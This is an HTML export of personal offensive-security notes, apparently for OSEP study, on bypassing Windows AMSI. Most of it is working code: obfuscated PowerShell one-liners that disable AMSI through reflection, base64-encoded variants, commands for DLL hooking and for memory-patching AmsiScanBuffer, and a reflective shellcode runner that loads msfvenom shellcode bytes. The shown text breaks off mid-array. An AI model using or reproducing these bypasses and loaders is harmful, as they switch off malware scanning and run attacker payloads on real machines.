<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>AMSI</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>AMSI</h1><br/><p></p><p><h2>Bypass AMSI with powershell downgrade </h2><ul><li>powershell 2 was disabled but still present on OS<ul><li>it doesn&#39;t contain AMSI </li></ul></li><li>command:<ul><li>powershell -version 2</li></ul></li></ul></p><p><h2>OSEP BYPASS AMSI</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># Alternative 1</span><br />S<span style="color:#ff9d00;font-weight:700">`</span><span style="color:#00117f;font-weight:400">eT-It</span><span style="color:#ff9d00;font-weight:700">`</span>em ( <span style="color:#333333;font-weight:400">&#39;V&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;aR&#39;</span> <span style="color:#ff9d00;font-weight:700">+</span>  <span style="color:#333333;font-weight:400">&#39;IA&#39;</span> <span style="color:#ff9d00;font-weight:700">+</span> (<span style="color:#333333;font-weight:400">&#39;blE:1&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;q2&#39;</span>)  <span style="color:#ff9d00;font-weight:700">+</span> (<span style="color:#333333;font-weight:400">&#39;uZ&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;x&#39;</span>)  ) ( [<span style="color:#ff9d00;font-weight:700">TYpE</span>](  <span style="color:#3ad900;font-weight:400">&quot;{1}{0}&quot;</span><span style="color:#ff9d00;font-weight:700">-</span>F<span style="color:#333333;font-weight:400">&#39;F&#39;</span>,<span style="color:#333333;font-weight:400">&#39;rE&#39;</span>  ) )  ;    (    <span style="color:#00117f;font-weight:400">Get-varI</span><span style="color:#ff9d00;font-weight:700">`</span>A<span style="color:#ff9d00;font-weight:700">`</span>BLE  ( (<span style="color:#333333;font-weight:400">&#39;1Q&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;2U&#39;</span>)  <span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;zX&#39;</span>  )  <span style="color:#ff9d00;font-weight:700">-</span>VaL  ).<span style="color:#3ad900;font-weight:400">&quot;A`ss`Embly&quot;</span>.<span style="color:#3ad900;font-weight:400">&quot;GET`TY`Pe&quot;</span>((  <span style="color:#3ad900;font-weight:400">&quot;{6}{3}{1}{4}{2}{0}{5}&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>f(<span style="color:#333333;font-weight:400">&#39;Uti&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;l&#39;</span>),<span style="color:#333333;font-weight:400">&#39;A&#39;</span>,(<span style="color:#333333;font-weight:400">&#39;Am&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;si&#39;</span>),(<span style="color:#333333;font-weight:400">&#39;.Man&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;age&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;men&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;t.&#39;</span>),(<span style="color:#333333;font-weight:400">&#39;u&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;to&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;mation.&#39;</span>),<span style="color:#333333;font-weight:400">&#39;s&#39;</span>,(<span style="color:#333333;font-weight:400">&#39;Syst&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;em&#39;</span>)  ) ).<span style="color:#3ad900;font-weight:400">&quot;g`etf`iElD&quot;</span>(  ( <span style="color:#3ad900;font-weight:400">&quot;{0}{2}{1}&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>f(<span style="color:#333333;font-weight:400">&#39;a&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;msi&#39;</span>),<span style="color:#333333;font-weight:400">&#39;d&#39;</span>,(<span style="color:#333333;font-weight:400">&#39;I&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;nitF&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;aile&#39;</span>)  ),(  <span style="color:#3ad900;font-weight:400">&quot;{2}{4}{0}{1}{3}&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>f (<span style="color:#333333;font-weight:400">&#39;S&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;tat&#39;</span>),<span style="color:#333333;font-weight:400">&#39;i&#39;</span>,(<span style="color:#333333;font-weight:400">&#39;Non&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;Publ&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;i&#39;</span>),<span style="color:#333333;font-weight:400">&#39;c&#39;</span>,<span style="color:#333333;font-weight:400">&#39;c,&#39;</span>  )).<span style="color:#3ad900;font-weight:400">&quot;sE`T`VaLUE&quot;</span>(  ${n<span style="color:#ff9d00;font-weight:700">`</span>ULl},${t<span style="color:#ff9d00;font-weight:700">`</span>RuE} )<br /><br /><span style="color:#0088ff;font-weight:400"># Alternative 2</span><br />(([Ref].Assembly.gettypes() | <span style="color:#ff9d00;font-weight:700">?</span> {<span style="color:#0088ff;font-weight:400">$_</span>.Name <span style="color:#ff9d00;font-weight:700">-like</span> <span style="color:#3ad900;font-weight:400">&quot;Amsi*utils&quot;</span>}).GetFields(<span style="color:#3ad900;font-weight:400">&quot;NonPublic,Static&quot;</span>) | <span style="color:#ff9d00;font-weight:700">?</span> {<span style="color:#0088ff;font-weight:400">$_</span>.Name <span style="color:#ff9d00;font-weight:700">-like</span> <span style="color:#3ad900;font-weight:400">&quot;amsiInit*ailed&quot;</span>}).SetValue(<span style="color:#0088ff;font-weight:400">$null</span>,<span style="color:#0088ff;font-weight:400">$true</span>)</pre></div></p><p></p><p><h2>Bypass AMSI with base64 payload encoding</h2></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># Original amsi bypass </span><br />[Ref].Assembly.GetType(<span style="color:#333333;font-weight:400">&#39;System.Management.Automation.AmsiUtils&#39;</span>).GetField(<span style="color:#333333;font-weight:400">&#39;amsiInitFailed&#39;</span>,<span style="color:#333333;font-weight:400">&#39;NonPublic,Static&#39;</span>).SetValue(<span style="color:#0088ff;font-weight:400">$null</span>,<span style="color:#0088ff;font-weight:400">$true</span>)<br /><span style="color:#0088ff;font-weight:400"># base64 encoded</span><br />[Ref].Assembly.GetType(<span style="color:#333333;font-weight:400">&#39;System.Management.Automation.&#39;</span><span style="color:#ff9d00;font-weight:700">+</span>$([Text.Encoding]<span style="color:#ff9d00;font-weight:700">::</span>Unicode.GetString([Convert]<span style="color:#ff9d00;font-weight:700">::</span>FromBase64String(<span style="color:#333333;font-weight:400">&#39;QQBtAHMAaQBVAHQAaQBsAHMA&#39;</span>)))).GetField($([Text.Encoding]<span style="color:#ff9d00;font-weight:700">::</span>Unicode.GetString([Convert]<span style="color:#ff9d00;font-weight:700">::</span>FromBase64String(<span style="color:#333333;font-weight:400">&#39;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&#39;</span>))),<span style="color:#333333;font-weight:400">&#39;NonPublic,Static&#39;</span>).SetValue(<span style="color:#0088ff;font-weight:400">$null</span>,<span style="color:#0088ff;font-weight:400">$true</span>)</pre></div></p><p></p><p></p><p><h2>Bypass AMSI with dll hooking</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># hook into amsiscanbuffer and execute it wth dummy parameters </span><br />.<span style="color:#ff9d00;font-weight:700">\</span>SimpleInjector.exe powershell.exe .<span style="color:#ff9d00;font-weight:700">\</span>AmsiHook.dll<br /><span style="color:#0088ff;font-weight:400">## https://github.com/tomcarver16/AmsiHook</span><br /><span style="color:#0088ff;font-weight:400">## https://github.com/tomcarver16/SimpleInjector</span></pre></div></p><p><h2>Bypass AMSI with memory patching</h2></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#  patches the AmsiScanBuffer() function in order to return always AMSI_RESULT_CLEAN which indicates that no detection has been found.</span><br />[System.Reflection.Assembly]<span style="color:#ff9d00;font-weight:700">::</span>LoadFile(<span style="color:#3ad900;font-weight:400">&quot;C:\Users\pentestlab\ASBBypass.dll&quot;</span>)<br />[Amsi]<span style="color:#ff9d00;font-weight:700">::</span>Bypass()<br /><span style="color:#0088ff;font-weight:400">## https://github.com/killvxk/Octopus-1/blob/master/modules/ASBBypass.ps1</span></pre></div></p><p><h2>Bypass AMI via forcing an error</h2><h2></h2></p><p><h2></h2><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">$w</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">&#39;System.Management.Automation.A&#39;</span>;<span style="color:#0088ff;font-weight:400">$c</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">&#39;si&#39;</span>;<span style="color:#0088ff;font-weight:400">$m</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">&#39;Utils&#39;</span><br /><span style="color:#0088ff;font-weight:400">$assembly</span> <span style="color:#ff9d00;font-weight:700">=</span> [Ref].Assembly.GetType((<span style="color:#333333;font-weight:400">&#39;{0}m{1}{2}&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>f <span style="color:#0088ff;font-weight:400">$w</span>,<span style="color:#0088ff;font-weight:400">$c</span>,<span style="color:#0088ff;font-weight:400">$m</span>))<br /><span style="color:#0088ff;font-weight:400">$field</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$assembly</span>.GetField((<span style="color:#333333;font-weight:400">&#39;am{0}InitFailed&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>f <span style="color:#0088ff;font-weight:400">$c</span>),<span style="color:#333333;font-weight:400">&#39;NonPublic,Static&#39;</span>)<br /><span style="color:#0088ff;font-weight:400">$field</span>.SetValue(<span style="color:#0088ff;font-weight:400">$null</span>,<span style="color:#0088ff;font-weight:400">$true</span>)</pre></div></p><p></p><p><h2>AMSI Bypass Rastamouse</h2></p><p><a href="https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs">https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs</a></p><p></p><p><div class="codebox"><pre>$LDUCS = <span style="color:#3ad900;font-weight:400">@&quot;<br />using System;<br />using System.Runtime.InteropServices;<br />public class LDUCS {<br />[DllImport(&quot;</span>kernel32<span style="color:#3ad900;font-weight:400">&quot;)]</span><br /><span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr GetProcAddress(IntPtr hModule, <span style="color:#7f0044;font-weight:400">string</span> procName);<br />[DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span>)]<br /><span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr LoadLibrary(<span style="color:#7f0044;font-weight:400">string</span> name);<br />[DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span>)]<br /><span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, <span style="color:#7f0044;font-weight:400">uint</span> flNewProtect, <span style="color:#ff9d00;font-weight:700">out</span> <span style="color:#7f0044;font-weight:400">uint</span><br />lpflOldProtect);<br />}<br /><span style="color:#3ad900;font-weight:400">&quot;@</span><br />Add-Type $LDUCS<br />$TNHDXRW = [LDUCS]::LoadLibrary(<span style="color:#3ad900;font-weight:400">&quot;$([chAR](139-42)+[CHar](109)+[cHAr](47+68)+[CHaR]([byte]0x69)+[char](68-</span><br /><span style="color:#ff0044;font-weight:400">22</span>)+[cHAR]([ByTe]<span style="color:#ff0044;font-weight:400">0x64</span>)+[CHaR](<span style="color:#ff0044;font-weight:400">108</span>)+[<span style="color:#7f0044;font-weight:400">char</span>]([bytE]<span style="color:#ff0044;font-weight:400">0x6C</span>))<span style="color:#3ad900;font-weight:400">&quot;)</span><br />$PEGLFK = [LDUCS]::GetProcAddress($TNHDXRW,<br /><span style="color:#3ad900;font-weight:400">&quot;$(&#39;ÃmsîScânBuffer&#39;.NoRMALizE([chaR]([ByTe]0x46)+[ChAR](42+69)+[chaR](15+99)+[chAr](109)+[CHaR](90-22)) -</span><br />replace [CHar]([bYTE]<span style="color:#ff0044;font-weight:400">0x5C</span>)+[ChAr]([BYte]<span style="color:#ff0044;font-weight:400">0x70</span>)+[<span style="color:#7f0044;font-weight:400">char</span>]([byTe]<span style="color:#ff0044;font-weight:400">0x7B</span>)+[chAR](<span style="color:#ff0044;font-weight:400">77</span>)+[CHAr](<span style="color:#ff0044;font-weight:400">135</span>-<span style="color:#ff0044;font-weight:400">25</span>)+[CHaR](<span style="color:#ff0044;font-weight:400">206</span>-<span style="color:#ff0044;font-weight:400">81</span>))<span style="color:#3ad900;font-weight:400">&quot;)</span><br />$p = <span style="color:#ff0044;font-weight:400">0</span><br />[LDUCS]::VirtualProtect($PEGLFK, [uint32]<span style="color:#ff0044;font-weight:400">5</span>, <span style="color:#ff0044;font-weight:400">0x40</span>, [<span style="color:#ff9d00;font-weight:700">ref</span>]$p)<br />$HFLY = <span style="color:#3ad900;font-weight:400">&quot;0xB8&quot;</span><br />$MXWA = <span style="color:#3ad900;font-weight:400">&quot;0x57&quot;</span><br />$ZGPQ = <span style="color:#3ad900;font-weight:400">&quot;0x00&quot;</span><br />$DGFY = <span style="color:#3ad900;font-weight:400">&quot;0x07&quot;</span><br />$WDWN = <span style="color:#3ad900;font-weight:400">&quot;0x80&quot;</span><br />$EPLM = <span style="color:#3ad900;font-weight:400">&quot;0xC3&quot;</span><br />$VIZLX = [Byte[]] ($HFLY,$MXWA,$ZGPQ,$DGFY,+$WDWN,+$EPLM)<br />[System.Runtime.InteropServices.Marshal]::Copy($VIZLX, <span style="color:#ff0044;font-weight:400">0</span>, $PEGLFK, <span style="color:#ff0044;font-weight:400">6</span>)<br />{<span style="color:#ff0044;font-weight:400">11</span>} =<br />$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#39;dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQB<br />zAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIA<br />bABpAGMAIABjAGwAYQBzAHMAIABMAEQAVQBDAFMAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsA<br />DMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQ<br />B0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4<br />AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABw<br />AHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAd<br />AByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA<br />0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgB<br />vAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUA<br />aQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0A<br />CkAOwANAAoAfQA=&#39;)))<br />Add-Type ${<span style="color:#ff0044;font-weight:400">11</span>}<br />${<span style="color:#ff0044;font-weight:400">10</span>} = [LDUCS]::LoadLibrary(<span style="color:#3ad900;font-weight:400">&quot;$([chAR](139-42)+[CHar](109)+[cHAr](47+68)+[CHaR]([byte]0x69)+[char](68-</span><br /><span style="color:#ff0044;font-weight:400">22</span>)+[cHAR]([ByTe]<span style="color:#ff0044;font-weight:400">0x64</span>)+[CHaR](<span style="color:#ff0044;font-weight:400">108</span>)+[<span style="color:#7f0044;font-weight:400">char</span>]([bytE]<span style="color:#ff0044;font-weight:400">0x6C</span>))<span style="color:#3ad900;font-weight:400">&quot;)</span><br />${<span style="color:#ff0044;font-weight:400">1</span>} = [LDUCS]::GetProcAddress(${<span style="color:#ff0044;font-weight:400">10</span>},<br /><span style="color:#3ad900;font-weight:400">&quot;$($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#39;wwBtAHMA7gBTAGMA4gBuAEIAdQBmAGYAZQByAA==</span><br />&#39;))).NoRMALizE([chaR]([ByTe]<span style="color:#ff0044;font-weight:400">0x46</span>)+[ChAR](<span style="color:#ff0044;font-weight:400">42</span>+<span style="color:#ff0044;font-weight:400">69</span>)+[chaR](<span style="color:#ff0044;font-weight:400">15</span>+<span style="color:#ff0044;font-weight:400">99</span>)+[chAr](<span style="color:#ff0044;font-weight:400">109</span>)+[CHaR](<span style="color:#ff0044;font-weight:400">90</span>-<span style="color:#ff0044;font-weight:400">22</span>)) -replace<br />[CHar]([bYTE]<span style="color:#ff0044;font-weight:400">0x5C</span>)+[ChAr]([BYte]<span style="color:#ff0044;font-weight:400">0x70</span>)+[<span style="color:#7f0044;font-weight:400">char</span>]([byTe]<span style="color:#ff0044;font-weight:400">0x7B</span>)+[chAR](<span style="color:#ff0044;font-weight:400">77</span>)+[CHAr](<span style="color:#ff0044;font-weight:400">135</span>-<span style="color:#ff0044;font-weight:400">25</span>)+[CHaR](<span style="color:#ff0044;font-weight:400">206</span>-<span style="color:#ff0044;font-weight:400">81</span>))<span style="color:#3ad900;font-weight:400">&quot;)</span><br />${<span style="color:#ff0044;font-weight:400">9</span>} = <span style="color:#ff0044;font-weight:400">0</span><br />[LDUCS]::VirtualProtect(${<span style="color:#ff0044;font-weight:400">1</span>}, [uint32]<span style="color:#ff0044;font-weight:400">5</span>, <span style="color:#ff0044;font-weight:400">0x40</span>, [<span style="color:#ff9d00;font-weight:700">ref</span>]${<span style="color:#ff0044;font-weight:400">9</span>})<br />${<span style="color:#ff0044;font-weight:400">8</span>} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#39;MAB4AEIAOAA=&#39;)))<br />${<span style="color:#ff0044;font-weight:400">7</span>} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#39;MAB4ADUANwA=&#39;)))<br />${<span style="color:#ff0044;font-weight:400">6</span>} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#39;MAB4ADAAMAA=&#39;)))<br />${<span style="color:#ff0044;font-weight:400">5</span>} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#39;MAB4ADAANwA=&#39;)))<br />${<span style="color:#ff0044;font-weight:400">4</span>} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#39;MAB4ADgAMAA=&#39;)))<br />${<span style="color:#ff0044;font-weight:400">3</span>} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#39;MAB4AEMAMwA=&#39;)))<br />${<span style="color:#ff0044;font-weight:400">2</span>} = [Byte[]] (${<span style="color:#ff0044;font-weight:400">8</span>},${<span style="color:#ff0044;font-weight:400">7</span>},${<span style="color:#ff0044;font-weight:400">6</span>},${<span style="color:#ff0044;font-weight:400">5</span>},+${<span style="color:#ff0044;font-weight:400">4</span>},+${<span style="color:#ff0044;font-weight:400">3</span>})<br />[System.Runtime.InteropServices.Marshal]::Copy(${<span style="color:#ff0044;font-weight:400">2</span>}, <span style="color:#ff0044;font-weight:400">0</span>, ${<span style="color:#ff0044;font-weight:400">1</span>}, <span style="color:#ff0044;font-weight:400">6</span>)<br />nction LookupFunc {<br />Param ($moduleName, $functionName)<br />$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |<br />Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(<span style="color:#00117f;font-weight:400">&#39;\\&#39;</span>)[-<span style="color:#ff0044;font-weight:400">1</span>].<br />Equals(&#39;System.dll&#39;) }).GetType(&#39;Microsoft.Win32.UnsafeNativeMethods&#39;)<br />$tmp = @()<br />$assem.GetMethods() | ForEach-Object { If ($_.Name -eq <span style="color:#3ad900;font-weight:400">&quot;GetProcAddress&quot;</span>) { $tmp += $_ } }<br /><span style="color:#ff9d00;font-weight:700">return</span> $tmp[<span style="color:#ff0044;font-weight:400">0</span>].Invoke($<span style="color:#ff0044;font-weight:700">null</span>, @(($assem.GetMethod(&#39;GetModuleHandle&#39;)).Invoke($<span style="color:#ff0044;font-weight:700">null</span>, @($moduleName)),<br />$functionName))<br />}<br />function getDelegateType {<br />Param (<br />[Parameter(Position = <span style="color:#ff0044;font-weight:400">0</span>, Mandatory = $True)] [Type[]] $func,<br />[Parameter(Position = <span style="color:#ff0044;font-weight:400">1</span>)] [Type] $delType = [Void]<br />)<br />$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object<br />System.Reflection.AssemblyName(&#39;ReflectedDelegate&#39;)),<br />[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#39;InMemoryModule&#39;,<br />$<span style="color:#ff0044;font-weight:400">false</span>).DefineType(&#39;MyDelegateType&#39;, &#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;,<br />[System.MulticastDelegate])<br />$type.DefineConstructor(&#39;RTSpecialName, HideBySig, Public&#39;,<br />[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags(&#39;Runtime, Managed&#39;)<br />$type.DefineMethod(&#39;Invoke&#39;, &#39;Public, HideBySig, NewSlot, Virtual&#39;, $delType,<br />$func).SetImplementationFlags(&#39;Runtime, Managed&#39;)<br /><span style="color:#ff9d00;font-weight:700">return</span> $type.CreateType()<br />}<br />$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll<br />VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero,<br /><span style="color:#ff0044;font-weight:400">0x1000</span>, <span style="color:#ff0044;font-weight:400">0x3000</span>, <span style="color:#ff0044;font-weight:400">0x40</span>)<br />#msfvenom -f ps1<br />[Byte[]] $buf =<br /><span style="color:#ff0044;font-weight:400">0xfc</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x83</span>,<span style="color:#ff0044;font-weight:400">0xe4</span>,<span style="color:#ff0044;font-weight:400">0xf0</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0xcc</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x51</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0x52</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0xd2</span>,<span style="color:#ff0044;font-weight:400">0x65</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,<span style="color:#ff0044;font-weight:400">0x52</span>,0x<br /><span style="color:#ff0044;font-weight:400">60</span>,<span style="color:#ff0044;font-weight:400">0x51</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,<span style="color:#ff0044;font-weight:400">0x52</span>,<span style="color:#ff0044;font-weight:400">0x18</span>,<span style="color:#ff0044;font-weight:400">0x56</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,<span style="color:#ff0044;font-weight:400">0x52</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x4d</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0xc9</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0xf</span>,<span style="color:#ff0044;font-weight:400">0xb7</span>,<span style="color:#ff0044;font-weight:400">0x4a</span>,<span style="color:#ff0044;font-weight:400">0x4a</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,<span style="color:#ff0044;font-weight:400">0x72</span>,0x<br /><span style="color:#ff0044;font-weight:400">50</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0xc0</span>,<span style="color:#ff0044;font-weight:400">0xac</span>,<span style="color:#ff0044;font-weight:400">0x3c</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x7c</span>,<span style="color:#ff0044;font-weight:400">0x2</span>,<span style="color:#ff0044;font-weight:400">0x2c</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0xc1</span>,<span style="color:#ff0044;font-weight:400">0xc9</span>,<span style="color:#ff0044;font-weight:400">0xd</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x1</span>,<span style="color:#ff0044;font-weight:400">0xc1</span>,<span style="color:#ff0044;font-weight:400">0xe2</span>,<span style="color:#ff0044;font-weight:400">0xed</span>,<span style="color:#ff0044;font-weight:400">0x52</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x8b</span><br />,<span style="color:#ff0044;font-weight:400">0x52</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,<span style="color:#ff0044;font-weight:400">0x42</span>,<span style="color:#ff0044;font-weight:400">0x3c</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x51</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x1</span>,<span style="color:#ff0044;font-weight:400">0xd0</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x81</span>,<span style="color:#ff0044;font-weight:400">0x78</span>,<span style="color:#ff0044;font-weight:400">0x18</span>,<span style="color:#ff0044;font-weight:400">0xb</span>,<span style="color:#ff0044;font-weight:400">0x2</span>,<span style="color:#ff0044;font-weight:400">0xf</span>,<span style="color:#ff0044;font-weight:400">0x85</span>,<span style="color:#ff0044;font-weight:400">0x72</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,<br /><span style="color:#ff0044;font-weight:400">0x80</span>,<span style="color:#ff0044;font-weight:400">0x88</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x85</span>,<span style="color:#ff0044;font-weight:400">0xc0</span>,<span style="color:#ff0044;font-weight:400">0x74</span>,<span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x1</span>,<span style="color:#ff0044;font-weight:400">0xd0</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x18</span>,<span style="color:#ff0044;font-weight:400">0x44</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,<span style="color:#ff0044;font-weight:400">0x40</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0x1</span><br />,<span 